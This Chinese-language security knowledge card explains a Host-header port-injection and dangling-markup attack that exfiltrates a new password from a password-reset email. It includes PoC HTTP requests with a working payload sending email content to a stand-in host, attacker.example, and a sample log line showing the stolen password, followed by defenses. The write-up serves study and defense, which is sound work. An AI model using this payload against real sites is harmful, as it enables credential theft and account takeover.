---
id: web-generic-auth-host-header-dangling-markup-password
title: Host 端口注入 + 悬垂标记窃取重置邮件中的新密码
type: scenario
domain: web
path: web/generic/auth
technique: host-dangling-markup-password-theft
aliases:
- 悬垂标记密码重置
- dangling markup password reset
- Host 端口注入
- 邮件 HTML 悬垂标记
- 密码重置邮件窃取
tags:
- web
- host-header
- password-reset
- dangling-markup
- email
- html-injection
- credential-theft
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:27:49+08:00'
  notes: 已对照原文核对；:64端口反射、Host注入'<a href=//攻击者/?悬垂标记、日志中出现新密码、登录carlos成功均一致；原文称非数字端口但截图用:64，卡内两种描述均保留；未复跑
---

## 一句话结论

当密码重置邮件把 Host（含端口）未转义地拼进 `href` 时，可先用非数字端口确认反射，再注入 `'<a href="//attacker/?` 这样的悬垂标记，让邮件中后续内容（包括直接写在正文里的新密码）被拼进攻击者 URL，从访问日志中窃取密码。

## 原理

- 邮件模板通常写成 `<a href="https://<host>/login">click here</a>`；`<host>` 取自请求 Host。若只校验域名、不校验端口，`Host: target:64` 会让邮件链接变成 `https://target:64/login`，且端口值原样反射。
- 注入 `Host: target:'<a href="//attacker/?` 后，邮件 HTML 变成：
  `href="https://target:<payload>/login">...`，其中 payload 提前闭合引号并开启一个新的未闭合 `<a href="//attacker/?`。
- HTML 解析时，后续所有文本（直到下一个引号）都成为这个新锚点的 URL 的一部分；如果邮件正文在新密码之前没有引号，新密码就会被包含进 URL。
- 邮件客户端或预览器渲染/加载该 HTML 时，会向 `//attacker/?...` 发起请求，访问日志中即出现包含新密码的路径。
- 与“把重置 token 放进链接”的传统密码重置投毒不同：这里链接指向普通登录页，token 不在 URL 中，秘密（新密码）直接写在邮件正文，因此需要 HTML 注入 + 悬垂标记把后续正文外带。

## 触发条件

- 密码重置邮件由服务端生成 HTML，且 Host/端口被反射进 `href` 或其它属性。
- 端口或 Host 未做 HTML 转义，允许注入引号与标签。
- 邮件客户端/预览器会加载邮件中的链接资源，或受害者会点击被污染的链接。
- 邮件正文在注入点之后包含敏感信息（如新密码、token）。

## 利用步骤

1. 用自己的账号请求密码重置，在邮件客户端查看原始邮件；确认链接是否含请求 Host 与端口。
2. 发送 `Host: target:64` 等非数字端口，确认站点可正常访问且邮件链接反射该端口。
3. 发送 `Host: target:'<a href="//attacker.example/?`，用户名改为受害者，触发新邮件。
4. 查看攻击者服务器访问日志，寻找形如 `GET /?/login'>...new password: <secret>` 的请求。
5. 从日志提取受害者新密码，登录验证。

## PoC

确认端口反射：

```http
POST /forgot-password HTTP/1.1
Host: target.example:64
Content-Type: application/x-www-form-urlencoded

username=wiener
```

邮件原始 HTML 中出现 `href="https://target.example:64/login"`。

注入悬垂标记：

```http
POST /forgot-password HTTP/1.1
Host: target.example:'<a href="//attacker.example/?
Content-Type: application/x-www-form-urlencoded

username=carlos
```

攻击者日志出现：

```text
GET /?/login'>click here</a> to login with your new password: <carlos-password> HTTP/1.1
```

## 变体与关联

- 变体：注入点可能在 `href`、`src`、`action`、CSS `url()`、邮件头等；不同上下文需调整闭合字符。
- 变体：不依赖端口，直接 Host 注入标签；或通过 `X-Forwarded-Host` 进入邮件模板。
- 关联：[[web-generic-auth-password-reset-host-header-poisoning]]（传统重置 token 外带）、[[web-generic-cache-poisoning-host-header-ambiguous-request]]。
- 注意：仅在授权测试环境验证，不要向真实用户发送钓鱼邮件。

## 检测与防御

- 密码重置链接使用固定配置的站点 URL，不从 Host/端口动态生成；至少对 Host 做严格 allowlist 并剥离端口。
- 邮件模板对所有插入值做 HTML 转义；不要在新密码前后留下可被悬垂标记利用的未闭合属性。
- 不在邮件正文直接发送新密码/敏感 token；使用一次性短时效链接。
- 邮件客户端限制外部资源加载与 HTML 渲染；部署 CSP/邮件安全网关检测悬垂标记。
- 监控 Host 含引号、尖括号、空格等异常字符的重置请求，以及外发邮件中的可疑链接域名。
